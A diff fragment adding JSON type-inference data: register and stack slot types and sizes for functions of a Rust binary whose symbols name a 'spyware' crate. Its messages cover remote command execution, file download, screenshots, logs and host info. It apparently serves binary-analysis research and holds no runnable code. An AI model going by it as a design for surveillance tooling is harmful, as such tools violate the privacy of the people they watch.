+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rdx": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rcx": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_xmm0": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "reg_xmm1": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "reg_xmm2": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_4": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_8": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_16": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_24": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_32": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_40": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_56": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_64": [
+        [
+          "array",
+          16
+        ]
+      ],
+      "stack_80": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_96": [
+        [
+          "array",
+          32
+        ]
+      ],
+      "stack_128": [
+        [
+          "array",
+          64
+        ]
+      ],
+      "stack_192": [
+        [
+          "array",
+          80
+        ]
+      ]
+    },
+    "_ZN7spyware13communication6server13handle_client17hb99b66a85b0a9c88E": {
+      "reg_rdx": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rcx": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rbx": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_r8": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_r9": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_4": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_8": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_16": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_32": [
+        [
+          "struct",
+          32
+        ]
+      ],
+      "stack_64": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_80": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_96": [
+        [
+          "struct",
+          32
+        ]
+      ],
+      "stack_128": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_144": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_152": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_160": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_176": [
+        [
+          "struct",
+          32
+        ]
+      ],
+      "stack_208": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_224": [
+        [
+          "primitive",
+          16
+        ]
+      ]
+    },
+    "_ZN7spyware13communication6server10run_server17hf575f6adb91dbfb6E": {
+      "reg_di": [
+        [
+          "primitive",
+          2
+        ]
+      ],
+      "reg_rbx": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rdx": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rcx": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_4": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_8": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_14": [
+        [
+          "primitive",
+          2
+        ]
+      ],
+      "stack_16": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_32": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_48": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_56": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_64": [
+        [
+          "&&primitive",
+          8
+        ]
+      ],
+      "stack_72": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_80": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_88": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_96": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_104": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "stack_112": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_120": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_128": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_144": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_160": [
+        [
+          "array",
+          48
+        ]
+      ],
+      "stack_208": [
+        [
+          "array",
+          72
+        ]
+      ]
+    },
+    "_ZN7spyware13communication8messages1_95_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..ErrorInfo$GT$9serialize17h8c3fceac6ed6801fE": {
+      "reg_rdx": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_eax": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "reg_ecx": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "reg_si": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "reg_xmm0": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "reg_xmm1": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_8": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_24": [
+        [
+          "struct",
+          32
+        ]
+      ],
+      "stack_56": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_64": [
+        [
+          "primitive",
+          1
+        ]
+      ]
+    },
+    "_ZN7spyware13communication8messages1_96_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..ErrorInfo$GT$11deserialize17h16e2a26e495d2d09E": {
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN7spyware13communication8messages1_103_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..RunCommandRequest$GT$9serialize17h05e636ca783c8b29E": {
+      "reg_rdx": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_eax": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "reg_ecx": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "reg_si": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "reg_xmm0": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "reg_xmm1": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_8": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_24": [
+        [
+          "struct",
+          32
+        ]
+      ],
+      "stack_56": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_64": [
+        [
+          "primitive",
+          1
+        ]
+      ]
+    },
+    "_ZN7spyware13communication8messages1_104_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..RunCommandRequest$GT$11deserialize17hf4107a861e3d2baeE": {
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN7spyware13communication8messages1_104_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..RunCommandResponse$GT$9serialize17hc9c819935a81fe1bE": {
+      "reg_rdx": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_eax": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "reg_ecx": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "reg_si": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "reg_xmm0": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "reg_xmm1": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_8": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_24": [
+        [
+          "struct",
+          32
+        ]
+      ],
+      "stack_56": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_64": [
+        [
+          "primitive",
+          1
+        ]
+      ]
+    },
+    "_ZN7spyware13communication8messages1_105_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..RunCommandResponse$GT$11deserialize17h67b73dba800a3318E": {
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN7spyware13communication8messages1_105_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..DownloadFileRequest$GT$9serialize17h54b8d5981f6378f4E": {
+      "reg_rdx": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_eax": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "reg_ecx": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "reg_si": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "reg_xmm0": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "reg_xmm1": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_8": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_16": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "stack_24": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_40": [
+        [
+          "struct",
+          32
+        ]
+      ]
+    },
+    "_ZN7spyware13communication8messages1_106_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..DownloadFileRequest$GT$11deserialize17h40c06322ea6d693bE": {
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN7spyware13communication8messages1_106_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..DownloadFileResponse$GT$9serialize17hacec97a4be0cc2f5E": {
+      "reg_rdx": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_eax": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "reg_ecx": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "reg_si": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "reg_xmm0": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "reg_xmm1": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_8": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_24": [
+        [
+          "struct",
+          32
+        ]
+      ],
+      "stack_56": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_64": [
+        [
+          "primitive",
+          1
+        ]
+      ]
+    },
+    "_ZN7spyware13communication8messages1_107_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..DownloadFileResponse$GT$11deserialize17h11c5c4e17211802eE": {
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN7spyware13communication8messages1_105_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..GetBasicInfoRequest$GT$9serialize17h0b9495116de8f9c4E": {
+      "reg_rdx": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_eax": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "reg_ecx": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "reg_si": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "reg_xmm0": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "reg_xmm1": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_8": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_16": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "stack_24": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_40": [
+        [
+          "struct",
+          32
+        ]
+      ]
+    },
+    "_ZN7spyware13communication8messages1_106_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..GetBasicInfoRequest$GT$11deserialize17hcdf93e6675e0bf2cE": {
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN7spyware13communication8messages1_101_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..OperatingSystem$GT$9serialize17h8cffced7504157a5E": {
+      "reg_edx": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN7spyware13communication8messages1_102_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..OperatingSystem$GT$11deserialize17h4c0914be652651d6E": {
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN7spyware13communication8messages1_98_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..Architecture$GT$9serialize17ha11211a0fbb1410aE": {
+      "reg_edx": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN7spyware13communication8messages1_99_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..Architecture$GT$11deserialize17h009a6242e6b769c4E": {
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN7spyware13communication8messages1_98_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..PointerWidth$GT$9serialize17h41945df7b7138b6dE": {
+      "reg_edx": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN7spyware13communication8messages1_99_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..PointerWidth$GT$11deserialize17ha507b2eb88982b6aE": {
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN7spyware13communication8messages1_106_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..GetBasicInfoResponse$GT$9serialize17h190e21248ceaec03E": {
+      "reg_rdx": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_eax": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "reg_ecx": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "reg_si": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "reg_xmm0": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "reg_xmm1": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_8": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_24": [
+        [
+          "struct",
+          32
+        ]
+      ],
+      "stack_56": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_64": [
+        [
+          "primitive",
+          1
+        ]
+      ]
+    },
+    "_ZN7spyware13communication8messages1_107_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..GetBasicInfoResponse$GT$11deserialize17hd883d2cf07aad750E": {
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN7spyware13communication8messages1_100_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..GetLogsRequest$GT$9serialize17he6158cb9ea855423E": {
+      "reg_rdx": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_eax": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_ecx": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "reg_si": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "stack_0": [
+        [
+          "array",
+          8
+        ]
+      ],
+      "stack_8": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_16": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "stack_17": [
+        [
+          "array",
+          31
+        ]
+      ]
+    },
+    "_ZN7spyware13communication8messages1_101_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..GetLogsRequest$GT$11deserialize17hb5de4e1218b29ce4E": {
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN7spyware13communication8messages1_101_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..GetLogsResponse$GT$9serialize17h0611f531c13c311fE": {
+      "reg_rdx": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_eax": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "reg_ecx": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "reg_si": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "reg_xmm0": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "reg_xmm1": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_8": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_24": [
+        [
+          "struct",
+          32
+        ]
+      ],
+      "stack_56": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_64": [
+        [
+          "primitive",
+          1
+        ]
+      ]
+    },
+    "_ZN7spyware13communication8messages1_102_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..GetLogsResponse$GT$11deserialize17hb2af3bb6c4c5294eE": {
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN7spyware13communication8messages1_106_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..GetScreenshotRequest$GT$9serialize17hbb0030a4e5e27df6E": {
+      "reg_rdx": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_eax": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_ecx": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "reg_si": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "stack_0": [
+        [
+          "array",
+          8
+        ]
+      ],
+      "stack_8": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_16": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "stack_17": [
+        [
+          "array",
+          31
+        ]
+      ]
+    },
+    "_ZN7spyware13communication8messages1_107_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..GetScreenshotRequest$GT$11deserialize17h10c33b48cca6c544E": {
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN7spyware13communication8messages1_103_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..DisplayScreenshot$GT$9serialize17h398c010cbc9d0042E": {
+      "reg_rdx": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_eax": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "reg_ecx": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "reg_si": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "reg_xmm0": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "reg_xmm1": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_8": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_24": [
+        [
+          "struct",
+          32
+        ]
+      ],
+      "stack_56": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_64": [
+        [
+          "primitive",
+          1
+        ]
+      ]
+    },
+    "_ZN7spyware13communication8messages1_104_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..DisplayScreenshot$GT$11deserialize17hc0278cfffef915f6E": {
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN7spyware13communication8messages1_107_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..GetScreenshotResponse$GT$9serialize17h248e03f41e757f8aE": {
+      "reg_rdx": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_eax": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "reg_ecx": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "reg_si": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "reg_xmm0": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "reg_xmm1": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_8": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_24": [
+        [
+          "struct",
+          32
+        ]
+      ],
+      "stack_56": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_64": [
+        [
+          "primitive",
+          1
+        ]
+      ]
+    },
+    "_ZN7spyware13communication8messages1_108_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..GetScreenshotResponse$GT$11deserialize17h64523546e7252f88E": {
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN7spyware13communication8messages7Message17RunCommandRequest17h075183aa725d84a0E": {
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "reg_xmm0": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN7spyware13communication8messages7Message18RunCommandResponse17h87f1971d57af5fa1E": {
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "reg_xmm0": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "reg_xmm1": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN7spyware13communication8messages7Message19DownloadFileRequest17hb5d1389eec76b978E": {
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN7spyware13communication8messages7Message20DownloadFileResponse17ha7620692d046dc59E": {
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "reg_xmm0": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "reg_xmm1": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN7spyware13communication8messages7Message19GetBasicInfoRequest17h8d9efe4a6a3d8bcfE": {
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN7spyware13communication8messages7Message20GetBasicInfoResponse17he560e1b25a0d5b84E": {
+      "reg_rdi": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "reg_xmm0": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "reg_xmm1": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "reg_xmm2": [
+        [
+          "primitive",
+          16
+        ]
+      ]
+    },
+    "_ZN7spyware13communication8messages7Message14GetLogsRequest17he8fe873e6a6e4263E": {
+      "reg_rdi": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ]
